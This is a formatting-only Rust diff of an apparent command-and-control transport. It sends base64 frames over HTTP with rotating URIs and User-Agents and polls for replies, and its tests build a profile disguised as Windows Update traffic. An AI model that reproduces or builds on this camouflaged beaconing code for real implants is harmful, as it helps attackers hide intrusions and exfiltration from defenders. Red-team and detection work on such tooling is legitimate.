@@ -226,10 +226,7 @@ impl MalleableTransport {
 
     /// Build an HTTP request with the configured method, URI, User-Agent, and
     /// custom headers.
-    fn build_request(
-        &mut self,
-        path: &str,
-    ) -> reqwest::blocking::RequestBuilder {
+    fn build_request(&mut self, path: &str) -> reqwest::blocking::RequestBuilder {
         let url = format!("{}{}", self.base_url, path);
         let ua = self.next_ua().to_string();
         let mut req = match self.profile.http_method.to_uppercase().as_str() {
@@ -264,22 +261,16 @@ impl Transport for MalleableTransport {
         let text = base64::engine::general_purpose::STANDARD.encode(frame);
         let uri = self.next_uri().to_string();
 
-        let resp = self
-            .build_request(&uri)
-            .body(text)
-            .send()
-            .map_err(|e| {
-                if e.is_timeout() {
-                    TransportError::Timeout
-                } else {
-                    TransportError::Transient("malleable send failed")
-                }
-            })?;
+        let resp = self.build_request(&uri).body(text).send().map_err(|e| {
+            if e.is_timeout() {
+                TransportError::Timeout
+            } else {
+                TransportError::Transient("malleable send failed")
+            }
+        })?;
 
         if resp.status().is_server_error() {
-            return Err(TransportError::Transient(
-                "malleable send: server error",
-            ));
+            return Err(TransportError::Transient("malleable send: server error"));
         }
         Ok(())
     }
@@ -294,18 +285,14 @@ impl Transport for MalleableTransport {
             match self.build_request(&uri).send() {
                 Ok(resp) if resp.status().is_success() => {
                     let body = resp.text().map_err(|_| {
-                        TransportError::Transient(
-                            "malleable recv: body decode error",
-                        )
+                        TransportError::Transient("malleable recv: body decode error")
                     })?;
 
                     if !body.is_empty() {
                         return base64::engine::general_purpose::STANDARD
                             .decode(body.trim())
                             .map_err(|_| {
-                                TransportError::Transient(
-                                    "malleable recv: base64 decode error",
-                                )
+                                TransportError::Transient("malleable recv: base64 decode error")
                             });
                     }
                     // Empty body → no data yet, keep polling.
@@ -315,9 +302,7 @@ impl Transport for MalleableTransport {
                 }
                 Err(e) => {
                     if !e.is_timeout() {
-                        return Err(TransportError::Transient(
-                            "malleable recv failed",
-                        ));
+                        return Err(TransportError::Transient("malleable recv failed"));
                     }
                     // Timeout → keep polling.
                 }
@@ -390,8 +375,7 @@ mod tests {
 
     #[test]
     fn windows_update_profile_constructs() {
-        let t =
-            MalleableTransport::windows_update("https://update.example.com".into());
+        let t = MalleableTransport::windows_update("https://update.example.com".into());
         assert_eq!(t.profile.http_method, "GET");
         assert_eq!(t.profile.uris.len(), 4);
         assert_eq!(t.profile.user_agents.len(), 2);
@@ -483,8 +467,7 @@ mod tests {
             headers: vec![],
             jitter_pct: 0,
         };
-        let t =
-            MalleableTransport::new("http://192.0.2.1".into(), profile);
+        let t = MalleableTransport::new("http://192.0.2.1".into(), profile);
         // Should return None within the 5 s hard timeout (plus connection
         // overhead), not hang indefinitely.
         let start = Instant::now();
@@ -513,7 +496,10 @@ mod tests {
     #[test]
     fn custom_method_mapping() {
         // Unknown/custom methods default to GET.
-        for method in &["GET", "get", "POST", "post", "PUT", "put", "DELETE", "delete", "PATCH", "patch", "HEAD", "head"] {
+        for method in &[
+            "GET", "get", "POST", "post", "PUT", "put", "DELETE", "delete", "PATCH", "patch",
+            "HEAD", "head",
+        ] {
             let profile = MalleableProfile {
                 http_method: method.to_string(),
                 uris: vec!["/x".into()],
